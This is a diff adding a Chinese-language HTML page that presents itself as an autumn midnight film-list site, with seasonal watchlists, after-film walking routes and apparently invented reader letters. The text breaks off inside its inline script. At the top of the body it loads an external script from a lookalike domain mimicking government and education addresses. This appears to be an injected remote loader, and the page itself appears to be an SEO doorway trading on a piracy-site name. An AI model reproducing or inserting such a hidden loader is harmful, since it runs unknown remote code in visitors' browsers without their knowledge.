@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞午夜电影网｜霜降后的一百个秋夜片单</title>
+<meta name="keywords" content="秋霞午夜电影网,秋夜观影,霜降片单,午夜场电影推荐,秋天氛围感佳片,秋日晚风">
+<meta name="description" content="秋霞午夜电影网（https://qiuxiawuyedianyingwang-zh.github.io）是一份贴在窗台上的秋夜放映清单：霜降之后，一百个夜里每天换一部。这里选片看三个指标——风声、火光、和看完要不要出门走一圈。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qiuxiawuyedianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#15110c; --paper:#1d170f; --paper2:#221b12;
+  --line:#3b3225; --line2:#5c4d38;
+  --tx:#f6efe2; --tx2:#c2b69c; --tx3:#8a7d64;
+  --aut:#c05621; --aut2:#e08a3c; --map:#b95c2f; --ink:#5a3a22; --tea:#d9c18f;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"Songti SC","STSong","SimSun","Noto Serif CJK SC",Georgia,serif;background:var(--bg);color:var(--tx);line-height:1.85;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+ background:radial-gradient(900px 600px at 82% 10%,rgba(192,86,33,.14),transparent 60%),
+ radial-gradient(700px 500px at 8% 92%,rgba(217,193,143,.07),transparent 60%);
+ background-attachment:fixed}
+img{max-width:100%}
+a{color:inherit;text-decoration:none}
+.inner{max-width:1120px;margin:0 auto;padding:0 26px;position:relative;z-index:1}
+h2,h3,h4{font-weight:700;line-height:1.45}
+section{padding:104px 0;position:relative;z-index:1}
+em{font-style:normal}
+
+/* ===== 顶栏 ===== */
+.hd{position:fixed;inset:0 0 auto 0;z-index:99;background:rgba(21,17,12,.86);backdrop-filter:blur(10px);border-bottom:1px solid rgba(185,92,47,.22)}
+.hd-i{display:flex;align-items:center;height:76px;gap:20px}
+.seal{width:42px;height:42px;border:1.5px solid var(--aut2);border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;line-height:1}
+.seal b{font-size:16px;color:var(--aut2)}
+.seal span{font-size:8px;letter-spacing:1px;color:var(--tx3);margin-top:2px}
+.lg{flex-shrink:0}
+.lg b{font-size:21px;letter-spacing:1px;font-weight:900}
+.lg b i{font-style:normal;color:var(--aut2)}
+.lg em{display:block;font-size:10px;color:var(--tx3);letter-spacing:4px;margin-top:1px}
+.weather{display:flex;gap:22px;font-size:12px;color:var(--tx3);margin-left:auto}
+.weather span b{color:var(--tea);font-weight:600;font-variant-numeric:tabular-nums}
+.nv{display:flex;gap:28px;font-size:15px}
+.nv a{color:var(--tx2);transition:.25s;padding:4px 0}
+.nv a:hover{color:var(--aut2)}
+.hm{display:none;background:none;border:none;color:var(--tx);font-size:24px;cursor:pointer;margin-left:auto}
+
+/* ===== HERO ===== */
+.hero{padding:170px 0 120px;border-bottom:1px solid var(--line)}
+.hero-i{display:grid;grid-template-columns:1fr .92fr;gap:70px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:12px;font-size:12px;color:var(--aut2);letter-spacing:3px}
+.kicker s{width:34px;height:1px;background:var(--aut2);text-decoration:none}
+.hero h1{font-size:clamp(40px,6.6vw,76px);line-height:1.16;margin:28px 0 26px;letter-spacing:-1px}
+.hero h1 span{color:var(--aut2)}
+.hero h1 small{display:block;font-size:.34em;color:var(--tx3);letter-spacing:6px;margin-top:22px;font-weight:400}
+.hero p{color:var(--tx2);font-size:16.5px;max-width:540px}
+.acts{display:flex;gap:16px;margin-top:40px;flex-wrap:wrap}
+.btn{background:var(--aut);color:var(--tx);padding:15px 32px;border-radius:3px;font-weight:700;font-size:15px;transition:.3s;border:1px solid var(--aut);letter-spacing:1px}
+.btn:hover{background:transparent;color:var(--aut2)}
+.btn-g{background:transparent;color:var(--tx);border:1px solid var(--line2);padding:15px 28px;border-radius:3px;font-size:15px;transition:.3s;letter-spacing:1px}
+.btn-g:hover{border-color:var(--aut2);color:var(--aut2)}
+.mix{margin-top:56px;padding-top:34px;border-top:1px dashed var(--line2);display:flex;gap:56px;flex-wrap:wrap}
+.mix div span{display:block;font-size:30px;font-weight:900;color:var(--tea);font-variant-numeric:tabular-nums}
+.mix div b{font-size:12px;color:var(--tx3);font-weight:400;letter-spacing:1px}
+
+/* 窗台日历 */
+.cald{background:var(--paper);border:1px solid var(--line2);border-radius:4px;overflow:hidden;box-shadow:0 34px 70px -34px rgba(0,0,0,.7)}
+.cald-h{background:linear-gradient(90deg,var(--aut),var(--map));padding:20px 24px;display:flex;justify-content:space-between;align-items:center;color:#fdf6ea}
+.cald-h b{font-size:16px;letter-spacing:2px}
+.cald-h em{font-size:12px;opacity:.92}
+.cald-b{padding:22px 24px}
+.cald-b p{font-size:13.5px;color:var(--tx2);margin-bottom:16px}
+.wind{display:flex;gap:10px;flex-wrap:wrap}
+.wind b{font-size:12px;padding:6px 12px;border:1px solid var(--line2);border-radius:3px;color:var(--tea);transition:.25s}
+.wind b.on{background:var(--aut);color:#fff;border-color:var(--aut)}
+.wind b:hover{color:var(--aut2);cursor:pointer}
+.pick{margin-top:20px;background:var(--bg);border:1px solid var(--line);border-radius:3px;padding:18px;min-height:130px}
+.pick em{font-size:11px;color:var(--aut2);letter-spacing:2px}
+.pick h4{font-size:21px;margin:8px 0 8px}
+.pick p{font-size:13.5px;color:var(--tx3)}
+.pick span{display:block;margin-top:12px;font-size:12px;color:var(--tea)}
+
+/* ===== 通用区块 ===== */
+.ey{font-size:11px;letter-spacing:4px;color:var(--aut2)}
+.sec-h{margin-bottom:56px}
+.sec-h h2{font-size:clamp(28px,4vw,42px);margin:10px 0 12px;letter-spacing:-.6px}
+.sec-h h2 i{font-style:normal;color:var(--aut2)}
+.sec-h p{color:var(--tx2);max-width:620px;font-size:15.5px}
+.sec-h.f{display:flex;justify-content:space-between;align-items:flex-end;gap:26px;flex-wrap:wrap}
+
+/* ===== 节气线 ===== */
+.qi{position:relative}
+.qi::before{content:"";position:absolute;left:0;right:0;top:96px;height:1px;background:linear-gradient(90deg,transparent,var(--line2) 12%,var(--line2) 88%,transparent)}
+.qgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:30px;position:relative}
+.qc{background:var(--paper);border:1px solid var(--line);border-top:3px solid var(--aut);border-radius:4px;padding:26px 24px;transition:.35s}
+.qc:hover{transform:translateY(-7px);border-color:var(--aut2);box-shadow:0 26px 54px -26px rgba(0,0,0,.7)}
+.qc em{font-size:11px;color:var(--aut2);letter-spacing:3px}
+.qc h3{font-size:24px;margin:12px 0 10px;letter-spacing:1px}
+.qc p{font-size:14.5px;color:var(--tx2)}
+.qc ol{list-style:none;margin-top:16px;padding-top:16px;border-top:1px dashed var(--line2)}
+.qc ol li{font-size:13.5px;color:var(--tx3);padding:5px 0}
+.qc ol li b{color:var(--tea);font-weight:600}
+
+/* ===== 秋夜十镜 ===== */
+.ten{background:var(--paper);border:1px solid var(--line);border-radius:4px;overflow:hidden}
+.ten-h{display:grid;grid-template-columns:1.05fr 1fr;gap:0;min-height:420px}
+.ten-l{background:linear-gradient(150deg,#2a1f12,#1d170f);padding:44px 40px;display:flex;flex-direction:column;justify-content:center;border-right:1px solid var(--line)}
+.ten-l em{font-size:12px;letter-spacing:4px;color:var(--aut2)}
+.ten-l h3{font-size:clamp(26px,3.2vw,34px);margin:16px 0 18px;letter-spacing:1px}
+.ten-l p{color:var(--tx2);font-size:15.5px}
+.ten-l div{margin-top:30px;display:flex;gap:10px;flex-wrap:wrap}
+.ten-l div b{font-size:12px;padding:6px 14px;border:1px solid var(--line2);border-radius:20px;color:var(--tea);cursor:pointer;transition:.25s}
+.ten-l div b.on{background:var(--aut2);color:#15110c;border-color:var(--aut2)}
+.ten-r{padding:40px}
+.fld{display:none;animation:fd .5s ease}
+.fld.on{display:block}
+@keyframes fd{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+.fld h4{font-size:22px;margin-bottom:14px;letter-spacing:1px}
+.fld dl{display:grid;gap:14px}
+.fld dl div{display:grid;grid-template-columns:78px 1fr;gap:14px;padding:10px 0;border-bottom:1px dashed var(--line)}
+.fld dt{font-size:12px;color:var(--aut2);letter-spacing:1px;padding-top:3px}
+.fld dd{font-size:14.5px;color:var(--tx2)}
+.fld dd b{color:var(--tx);font-weight:600}
+
+/* ===== 散步地图 ===== */
+.map{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:start}
+.walk{display:flex;flex-direction:column;gap:0}
+.wk{display:grid;grid-template-columns:64px 1fr;gap:22px;padding:24px 0;border-bottom:1px solid var(--line);transition:.3s}
+.wk:hover{background:rgba(192,86,33,.06);padding-left:14px}
+.wk em{font-size:12px;color:var(--aut2);letter-spacing:1px;padding-top:4px;border-top:2px solid var(--aut2)}
+.wk h4{font-size:19px;margin-bottom:6px}
+.wk p{font-size:14.5px;color:var(--tx2)}
+.wk span{display:block;margin-top:10px;font-size:12px;color:var(--tea)}
+.side{background:var(--paper);border:1px solid var(--line2);border-radius:4px;padding:0;overflow:hidden;position:sticky;top:100px}
+.side-h{padding:22px 26px;background:var(--aut);color:#fdf6ea}
+.side-h b{font-size:15px;letter-spacing:2px}
+.side-h em{display:block;font-size:12px;opacity:.9;margin-top:4px}
+.side ul{list-style:none;padding:10px 0}
+.side li{padding:16px 26px;border-bottom:1px solid var(--line);transition:.25s;cursor:pointer}
+.side li:hover{background:rgba(217,193,143,.06)}
+.side li.on{background:rgba(224,138,60,.12);border-left:3px solid var(--aut2)}
+.side li b{display:block;font-size:16px;margin-bottom:5px}
+.side li span{font-size:12.5px;color:var(--tx3)}
+
+/* ===== 灯火人家 ===== */
+.lan{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:linear-gradient(180deg,rgba(192,86,33,.05),transparent)}
+.fam{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:22px}
+.fm{background:var(--paper2);border:1px solid var(--line);border-radius:4px;padding:28px;transition:.3s;position:relative}
+.fm:hover{border-color:var(--aut2)}
+.fm::after{content:"";position:absolute;top:22px;right:24px;width:7px;height:7px;border-radius:50%;background:var(--tea)}
+.fm time{font-size:12px;color:var(--aut2);letter-spacing:2px}
+.fm h4{font-size:20px;margin:12px 0 10px}
+.fm p{font-size:14.5px;color:var(--tx2)}
+.fm cite{display:block;margin-top:18px;font-size:12.5px;color:var(--tx3);font-style:normal;border-top:1px dashed var(--line2);padding-top:12px}
+
+/* ===== 信笺 ===== */
+.letter{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:start}
+.lf{background:var(--paper);border:1px solid var(--line2);border-radius:4px;padding:38px;box-shadow:0 26px 60px -30px rgba(0,0,0,.7)}
+.lf em{font-size:12px;letter-spacing:3px;color:var(--aut2)}
+.lf h3{font-size:26px;margin:14px 0 8px;letter-spacing:1px}
+.lf p{color:var(--tx3);font-size:14px;margin-bottom:26px}
+.lf label{display:block;font-size:14px;color:var(--tx2);margin-bottom:18px}
+.lf input,.lf textarea{width:100%;margin-top:7px;background:var(--bg);border:none;border-bottom:1px solid var(--line2);padding:11px 2px;color:var(--tx);font-size:15.5px;outline:none;font-family:inherit;border-radius:0}
+.lf input:focus,.lf textarea:focus{border-bottom-color:var(--aut2)}
+.lf textarea{resize:vertical;min-height:110px}
+.lf button{margin-top:14px;width:100%;background:var(--aut);border:none;color:#fdf6ea;padding:16px;border-radius:3px;font-weight:700;font-size:15px;letter-spacing:2px;cursor:pointer;transition:.3s}
+.lf button:hover{background:var(--aut2)}
+.lf small{display:block;margin-top:18px;font-size:12px;color:var(--tx3);text-align:center}
+.wall2{display:flex;flex-direction:column;gap:16px}
+.w2{background:linear-gradient(165deg,#241c12,#1a140d);border:1px solid var(--line);border-left:2px solid var(--aut);border-radius:3px;padding:22px 24px}
+.w2 b{font-size:13px;color:var(--tx3);letter-spacing:1px}
+.w2 p{font-size:15.5px;margin:10px 0 14px;color:var(--tx)}
+.w2 span{font-size:11.5px;color:var(--aut2);letter-spacing:1px}
+
+/* ===== 霜降 ===== */
+.frost{text-align:center;padding:120px 0;border-top:1px solid var(--line)}
+.frost em{font-size:12px;letter-spacing:5px;color:var(--aut2)}
+.frost h2{font-size:clamp(30px,5vw,54px);margin:18px 0;letter-spacing:2px}
+.frost h2 i{font-style:normal;color:var(--aut2)}
+.frost p{color:var(--tx2);max-width:600px;margin:0 auto;font-size:15.5px}
+.frost div{margin-top:46px;font-size:13px;color:var(--tx3);letter-spacing:2px;font-variant-numeric:tabular-nums}
+
+/* ===== 页脚 ===== */
+.ft{background:#0f0c08;border-top:1px solid var(--line);padding:60px 0 28px;position:relative;z-index:1}
+.ft-i{display:grid;grid-template-columns:1fr 1.6fr;gap:54px;margin-bottom:44px}
+.ft-l b{font-size:20px;font-weight:900;letter-spacing:1px}
+.ft-l b i{font-style:normal;color:var(--aut2)}
+.ft-l em{display:block;font-size:11px;color:var(--aut2);letter-spacing:3px;margin:8px 0 16px}
+.ft-l p{font-size:14px;color:var(--tx3)}
+.ft-c{display:grid;grid-template-columns:repeat(3,1fr);gap:28px}
+.ft-c h6{font-size:12px;letter-spacing:3px;color:var(--tx3);margin-bottom:16px}
+.ft-c a{display:block;color:var(--tx2);font-size:14.5px;padding:6px 0;transition:.2s}
+.ft-c a:hover{color:var(--aut2)}
+.ft-b{display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px;padding-top:24px;border-top:1px solid var(--line);font-size:12px;color:var(--tx3)}
+.ft-b a{color:var(--aut2)}
+
+/* ===== 响应式 ===== */
+@media (max-width:980px){
+  .hero-i,.map,.letter{grid-template-columns:1fr;gap:48px}
+  .ten-h{grid-template-columns:1fr}
+  .ten-l{border-right:none;border-bottom:1px solid var(--line)}
+  .side{position:static}
+  .ft-i{grid-template-columns:1fr}
+  .weather{display:none}
+  .nv{display:none}
+}
+@media (max-width:660px){
+  .hm{display:block}
+  .nv{position:fixed;top:76px;left:0;right:0;flex-direction:column;background:var(--paper);padding:14px 26px;gap:0;border-bottom:1px solid var(--line);transform:translateY(-220%);transition:.35s}
+  .nv.open{transform:translateY(0)}
+  .nv a{padding:16px 0;border-bottom:1px solid var(--line);font-size:15.5px}
+  section{padding:70px 0}
+  .hero{padding:130px 0 84px}
+  .acts .btn,.acts .btn-g{flex:1;text-align:center}
+  .mix{gap:34px}
+  .ft-c{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="hd">
+  <div class="inner hd-i">
+    <div class="seal"><b>霜</b><span>秋夜</span></div>
+    <div class="lg"><b>秋霞午夜电影网</b><em>Q I U X I A &nbsp;·&nbsp; M I D N I G H T</em></div>
+    <nav class="nv" id="nv">
+      <a href="#qi">霜降六候</a>
+      <a href="#ten">秋夜十镜</a>
+      <a href="#map">散后散步</a>
+      <a href="#lan">灯火人家</a>
+      <a href="#mail">寄一封信</a>
+      <a href="#frost">霜降</a>
+    </nav>
+    <div class="weather"><span>今夜 <b id="tp">11.4</b>℃</span><span>风 <b id="wd">北</b></span><span>能见度 <b id="vs">3</b>km</span></div>
+    <button class="hm" aria-label="菜单" onclick="tg()">☰</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="inner hero-i">
+    <div>
+      <span class="kicker"><s></s>霜降之后 · 每晚一部 · 换到立冬</span>
+      <h1>一百个秋夜里，<span>总有一部是为你留的</span><small>秋 霞 午 夜 电 影 网 · 窗 台 放 映 清 单</small></h1>
+      <p>不按评分排片。我们选片只看三件事：风声够不够大、有没有一处火光、看完你愿不愿意出门走一圈。冷的时候适合看慢的，风大的时候适合看有去处的。</p>
+      <div class="acts">
+        <a class="btn" href="#qi">看今夜放什么</a>
+        <a class="btn-g" href="#ten">翻十面镜子</a>
+      </div>
+      <div class="mix">
+        <div><span>100</span><b>个秋夜 · 每日一换</b></div>
+        <div><span>6</span><b>候 · 六段节气</b></div>
+        <div><span>3</span><b>项 · 选片指标</b></div>
+      </div>
+    </div>
+    <div class="cald">
+      <div class="cald-h"><b>窗 台 日 历</b><em>第 14 夜 / 共 100 夜</em></div>
+      <div class="cald-b">
+        <p>点风向，挑一个今夜合得上的说法。每天零点自动翻到下一夜。</p>
+        <div class="wind" id="wind">
+          <b class="on" data-i="0">北风 · 适合走路</b><b data-i="1">无风 · 适合坐着</b><b data-i="2">西风 · 适合回头</b><b data-i="3">风大 · 适合待在家</b>
+        </div>
+        <div class="pick">
+          <em>今 夜 推 荐</em>
+          <h4 id="pT">小森林 冬春篇</h4>
+          <p id="pP">雪还没化，一个人把冬天的菜收进地窖。适合没开暖气的房间。</p>
+          <span id="pS">森淳一 · 2015 · 助眠级慢</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 霜降六候 -->
+<section class="qi" id="qi">
+  <div class="inner">
+    <div class="sec-h"><span class="ey">六 候 · 节 气 分 区</span><h2>霜降 <i>六候</i></h2><p>古人把霜降分成六段物候。我们也把这一百个夜分成六段情绪：每一候有它的温度和它该看的片子。</p></div>
+    <div class="qgrid">
+      <article class="qc"><em>一候 · 豺乃祭兽</em><h3>猎食期</h3><p>夜里还不太冷，人坐不住。适合那种有追逐、有路、主角一直在动的片子。</p><ol><li><b>德州巴黎</b> — 四年找一个人</li><li><b>摩托日记</b> — 出发的时候他还是学生</li><li><b>上帝之城</b> — 里约热内卢的另一个清晨</li></ol></article>
+      <article class="qc"><em>二候 · 草木黄落</em><h3>落叶期</h3><p>叶子开始往下掉，人容易想起旧事。这个时段选的都是告别很长的片子。</p><ol><li><b>情书</b> — 两封信隔了十年才寄到</li><li><b>蓝色大门</b> — 游泳池边的告白</li><li><b>比海更深</b> — 台风天一家人挤在一起</li></ol></article>
+      <article class="qc"><em>三候 · 蛰虫咸俯</em><h3>入蛰期</h3><p>虫子都不动了，你也该静下来。长片、独白、一个人走很远的路。</p><ol><li><b>驾驶我的车</b> — 后座上三个小时的话</li><li><b>修女艾达</b> — 80 分钟，黑白，留白</li><li><b>温蒂妮</b> — 水下的那个承诺</li></ol></article>
+      <article class="qc"><em>四候 · 寒气凝结</em><h3>凝霜期</h3><p>玻璃上开始有花纹。这个时段选的片子都有很重的颜色。</p><ol><li><b>花样年华</b> — 204 分钟，走廊与雨</li><li><b>燃烧</b> — 李沧东，绿色大棚与饥饿</li><li><b>色，戒</b> — 麻将桌上的三十分钟</li></ol></article>
+      <article class="qc"><em>五候 · 农事收仓</em><h3>收仓期</h3><p>庄稼都收完了，人该回到厨房。食物、家人、老房子。</p><ol><li><b>饮食男女</b> — 开场六分钟的菜</li><li><b>小森林 夏秋篇</b> — 番茄罐头的正确做法</li><li><b>海街日记</b> — 海边四姐妹的日常</li></ol></article>
+      <article class="qc"><em>六候 · 夜长初寒</em><h3>长夜期</h3><p>夜开始比昼长。这个时段的片子要好看，还要慢，才能撑到天亮。</p><ol><li><b>小森林 冬春篇</b> — 雪、萝卜、米饭</li><li><b>南极之恋</b> — 两个人只能互相做饭</li><li><b>少年派的奇幻漂流</b> — 老虎走了以后更空</li></ol></article>
+    </div>
+  </div>
+</section>
+
+<!-- 秋夜十镜 -->
+<section id="ten">
+  <div class="inner">
+    <div class="sec-h f"><div><span class="ey">十 镜 · 十 种 看 法</span><h2>秋夜十镜</h2><p>同一部片子，夜里看和白天看不是同一部。我们记下十种只在夜里才成立的看法。</p></div><a href="#" style="color:var(--aut2);font-size:14.5px">十镜目录 ›</a></div>
+    <div class="ten">
+      <div class="ten-h">
+        <div class="ten-l">
+          <em id="flE">镜 一</em>
+          <h3 id="flT">风是从哪一幕开始变大的</h3>
+          <p id="flP">夜里看电影会注意到风。不是剧情里的风，是声音里的——树叶、窗帘、车门。有些片子全靠风声撑住了整个夜。</p>
+          <div id="flB">
+            <b class="on">风声</b><b>火光</b><b>脚步</b><b>水</b><b>沉默</b><b>食物</b><b>钟声</b><b>雨</b><b>火车</b><b>猫</b>
+          </div>
+        </div>
+        <div class="ten-r" id="flR"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 散后散步 -->
+<section id="map">
+  <div class="inner">
+    <div class="sec-h"><span class="ey">散 场 后 的 路</span><h2>散场后散步地图</h2><p>片子看完了，人还不想回家。这里七条路线，每条都标了适合几点走、路上能想什么。</p></div>
+    <div class="map">
+      <div class="walk">
+        <div class="wk"><em>22:40</em><div><h4>滨江步道 · 往北走到第三个路灯</h4><p>水面反光很亮，不用开手电。看完公路片最适合这一段。</p><span>适配影片：《德州巴黎》《摩托日记》｜ 单程 2.4 公里</span></div></div>
+        <div class="wk"><em>23:10</em><div><h4>老城巷子 · 绕开主街走背街</h4><p>没有车，能听见自己的脚步。看完告别类的片子走这里，哭也不显眼。</p><span>适配影片：《情书》《比海更深》｜ 绕行约 40 分钟</span></div></div>
+        <div class="wk"><em>23:45</em><div><h4>夜市后巷 · 只买热的</h4><p>摊子快收了，剩下的都是热的。看完《饮食男女》必走。</p><span>适配影片：《饮食男女》《小森林》｜ 停留 20 分钟</span></div></div>
+        <div class="wk"><em>00:20</em><div><h4>高架桥下 · 听货车过去</h4><p>夜里的货车声和片子里的配乐会叠在一起，这是意外收获。</p><span>适配影片：《驾驶我的车》《温蒂妮》｜ 无灯，注意安全</span></div></div>
+        <div class="wk"><em>01:00</em><div><h4>小区楼下长椅 · 坐到困</h4><p>风停了就回家。这是助眠场之后的标准动作。</p><span>适配影片：《小森林 冬春篇》《海街日记》</span></div></div>
+        <div class="wk"><em>随时</em><div><h4>原地不动 · 站在阳台抽一根烟的时间</h4><p>没有阳台的就看窗外。窗台上贴一张片子名，比什么都管用。</p><span>适配影片：全部 ｜ 成本为零</span></div></div>
+      </div>
+      <aside class="side">
+        <div class="side-h"><b>夜 跑 温 度 计</b><em>根据今夜气温给的穿衣与片长建议</em></div>
+        <ul id="tmpL"></ul>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 灯火人家 -->
+<section class="lan" id="lan">
+  <div class="inner">
+    <div class="sec-h f"><div><span class="ey">灯 火 人 家 · 观 众 投 稿</span><h2>灯火人家</h2><p>都是观众写来的。一个人看片的夜里，最容易把心里话讲给片子听。</p></div><a href="#mail" style="color:var(--aut2);font-size:14.5px">也写一封 ›</a></div>
+    <div class="fam">
+      <article class="fm"><time>第 11 夜 · 10.02</time><h4>把《海街日记》看成了食谱</h4><p>那一碗鲭鱼饭我照着做了，鱼买贵了，但真的有用。今夜温度差不多，我又做了一遍。</p><cite>— 住在三楼的人，厨房朝北</cite></article>
+      <article class="fm"><time>第 9 夜 · 09.30</time><h4>《驾驶我的车》是给司机的片子</h4><p>我开夜车，听完了三段独白。后座没有人，但我觉得有人在说话。</p><cite>— 跑省道的，凌晨两点还在路上</cite></article>
+      <article class="fm"><time>第 7 夜 · 09.28</time><h4>看完《比海更深》给妈打了电话</h4><p>台风天那段，我们家也经历过。电话响到第三声她才接，说还没睡。</p><cite>— 在外地工作的女儿</cite></article>
+      <article class="fm"><time>第 4 夜 · 09.25</time><h4>《修女艾达》让我关了灯看</h4><p>黑白的片子，关灯之后反而亮。这一点我之前不知道。</p><cite>— 一位把亮度调低的观众</cite></article>
+      <article class="fm"><time>第 2 夜 · 09.23</time><h4>《小森林》是教学片</h4><p>我照着做了七道菜，只有两道成功。冬春篇那一段我现在还留着。</p><cite>— 一个人住，冰箱里只有萝卜</cite></article>
+      <article class="fm"><time>第 1 夜 · 09.22</time><h4>第一天，窗台上贴了张片子名</h4><p>风很大，我把纸条用胶带贴了两层。第二天它还好好的。</p><cite>— 本栏目的第一个读者</cite></article>
+    </div>
+  </div>
+</section>
+
+<!-- 信笺 -->
+<section id="mail">
+  <div class="inner">
+    <div class="sec-h f"><div><span class="ey">窗 台 信 箱</span><h2>寄一封信</h2><p>不留评论区。信是写给下一个秋夜的人看的，我们会贴在窗台上。</p></div><a href="#" style="color:var(--aut2);font-size:14.5px">已贴出的信 ›</a></div>
+    <div class="letter">
+      <form class="lf" onsubmit="event.preventDefault();var b=this.querySelector('button');b.textContent='已贴上窗台 · 明天零点可见';b.disabled=true">
+        <em>L E T T E R &nbsp; N O . 1 2 7</em>
+        <h3>写给某个秋夜的你</h3>
+        <p>一句话也行，写明你在哪个夜、看完哪一部、窗外的风往哪儿吹。</p>
+        <label>这一夜你看了什么
+          <input type="text" placeholder="片名、导演、甚至一句台词" maxlength="40">
+        </label>
+        <label>今夜的风
+          <input type="text" placeholder="北风 / 无风 / 风大 / 雨" maxlength="12">
+        </label>
+        <label>想说的话
+          <textarea placeholder="写给你自己，或者写给片子里那个人" required></textarea>
+        </label>
+        <button type="submit">折好 · 贴上窗台</button>
+        <small>本站网址 https://qiuxiawuyedianyingwang-zh.github.io · 信件只公开正文，不留联系方式</small>
+      </form>
+      <div class="wall2">
+        <div class="w2"><b>第 124 封 · 10.03 凌晨</b><p>今夜无风。把《情书》看完了，决定不去翻旧相册。</p><span>窗台 · 南</span></div>
+        <div class="w2"><b>第 118 封 · 09.29 午夜</b><p>风大，把《驾驶我的车》声音调小了。独白反而听得更清。</p><span>窗台 · 西</span></div>
+        <div class="w2"><b>第 105 封 · 09.26 一点</b><p>《小森林》那段做番茄罐头，我做了两罐，一罐送了邻居。</p><span>窗台 · 北</span></div>
+        <div class="w2"><b>第 96 封 · 09.24 零点</b><p>第一天翻到这个清单，现在每天都来。</p><span>窗台 · 东</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 霜降 -->
+<section class="frost" id="frost">
+  <div class="inner">
+    <em>霜 降 · 十 月 二 十 三 日</em>
+    <h2>霜一降，<i>夜就长了</i></h2>
+    <p>这份清单从霜降那天开始贴，贴到立冬收起来。一百个夜，一天换一张。如果你在某个夜里看见窗台上还贴着同一张，那是风没吹走，也是我没舍得换。</p>
+    <div id="cd">距立冬换片 · 尚余 — 日 — 时 — 分 — 秒</div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="inner">
+    <div class="ft-i">
+      <div class="ft-l"><b>秋霞午夜电影网</b><em>窗台放映清单 · 霜降起 · 立冬至</em><p>本站网址：https://qiuxiawuyedianyingwang-zh.github.io<br>一百个秋夜里每天换一部，选片看风声、火光、与看完要不要出门走一圈</p></div>
+      <div class="ft-c">
+        <div><h6>六候</h6><a href="#qi">猎食期</a><a href="#qi">落叶期</a><a href="#qi">入蛰期</a><a href="#qi">长夜期</a></div>
+        <div><h6>十镜</h6><a href="#ten">风声镜</a><a href="#ten">火光镜</a><a href="#ten">脚步镜</a><a href="#ten">沉默镜</a></div>
+        <div><h6>窗台</h6><a href="#map">散步地图</a><a href="#lan">灯火人家</a><a href="#mail">寄一封信</a><a href="#frost">霜降</a></div>
+      </div>
+    </div>
+    <div class="ft-b"><span>© 2024–2026 秋霞午夜电影网 · 本站仅提供影片资料与秋夜观影建议，不提供任何观看资源，版权归各制片方所有</span><a href="#">联系窗台</a></div>
+  </div>
+</footer>
+
+<script>
+/* 窗台日历 */
+var WIN=[
+ {t:"小森林 冬春篇",p:"雪还没化，一个人把冬天的菜收进地窖。适合没开暖气的房间。",s:"森淳一 · 2015 · 助眠级慢"},
+ {t:"驾驶我的车",p:"三个小时的后座独白，北风夜开长途的人会认。",s:"滨口龙介 · 2021 · 179 分钟"},
+ {t:"比海更深",s:"是枝裕和 · 2016 · 台风天一家人"},
+ {t:"花样年华",p:"走廊和雨。风大的夜里看，会想给一个人发消息。",s:"王家卫 · 2000 · 204 分钟"}
+];
+document.querySelectorAll('#wind b').forEach(function(b){
+  b.addEventListener('click',function(){
+    document.querySelectorAll('#wind b').forEach(function(x){x.classList.remove('on')});
+    b.classList.add('on');
+    var o=WIN[Number(b.dataset.i)];
+    var p=document.querySelector('.pick');
+    p.style.opacity='0';
+    setTimeout(function(){document.getElementById('pT').textContent=o.t;document.getElementById('pP').textContent=o.p;document.getElementById('pS').textContent=o.s;p.style.opacity='1'},220);
+  });
+});
+document.querySelector('.pick').style.transition='opacity .3s';
+
+/* 十镜 */
+var FL=[
+ {e:"镜 一",t:"风是从哪一幕开始变大的",p:"夜里看电影会注意到风。不是剧情里的风，是声音里的——树叶、窗帘、车门。有些片子全靠风声撑住了整个夜。",
+  d:[["《小森林 冬春篇》","雪地那一幕，风声盖过了配乐"],["《温蒂妮》","水下的段落，其实全是风的逻辑"],["《德州巴黎》","开头十分钟只有风和远景"]]},
+ {e:"镜 二",t:"火光只出现了几次",p:"夜里对火光最敏感。一盏灯、一根火柴、一个打火机，就够让整场戏暖过来。",
+  d:[["《燃烧》","绿色大棚那一夜，火光是唯一的光源"],["《南极之恋》","两个人只能靠那个炉子"],["《饮食男女》","开场六分钟的厨房火"]]},
+ {e:"镜 三",t:"脚步声是夜的节拍器",p:"白天你会忽略脚步，夜里它能数出情绪。一个人的走路长度，往往就是一部片子的长度。",
+  d:[["《修女艾达》","雪地里那一段走路，是全片最好的一课"],["《野草莓》","七十八岁的人，走了一夜的路"],["《海街日记》","四姐妹回家的那段坡路"]]},
+ {e:"镜 四",t:"水在哪里",p:"夜里的雨、河、浴缸、海，都不是布景，是语气。听到水声，人才会松下来。",
+  d:[["《水形物语》","水是全部的语境"],["《小森林 夏秋篇》","雨水接番茄罐头的声音"],["《温蒂妮》","承诺是在水里答应的"]]},
+ {e:"镜 五",t:"沉默也是台词",p:"有些片子在夜里看，台词越少越重。安静不是留白，是给你自己说话的位置。",
